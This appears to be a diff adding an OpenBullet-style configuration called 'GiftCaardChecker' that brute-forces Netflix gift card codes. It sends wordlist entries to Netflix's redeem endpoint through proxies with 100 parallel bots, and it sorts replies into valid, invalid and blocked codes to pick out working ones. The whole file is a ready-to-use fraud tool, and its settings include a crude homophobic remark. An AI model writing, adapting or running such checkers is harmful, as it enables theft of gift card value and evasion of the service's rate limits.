@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "GiftCaardChecker",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-07T05:21:02.3282915+07:00",
+  "AdditionalInfo": "the person who made this config is 100% not gay",
+  "Author": "whymegodwhy",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.netflix.com/redeem" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET REQUEST GET "https://www.netflix.com/redeem" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#auth PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" Recursive=FALSE -> VAR "auth" "" "" 
+REQUEST POST "https://www.netflix.com/redeem" AutoRedirect=TRUE 
+  CONTENT "authURL=<auth>&flow=giftCard&mode=redeem&action=nextAction&withFields=code&code=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The code entered is not valid" 
+  KEYCHAIN Ban OR 
+    KEY "We were unable to process your request." 
+  KEYCHAIN Ban OR 
+    KEY "An error occurred during gift redemption" 
+  KEYCHAIN Success OR 
+    KEY "content=\"nflx://www.netflix.com/simplegift" 
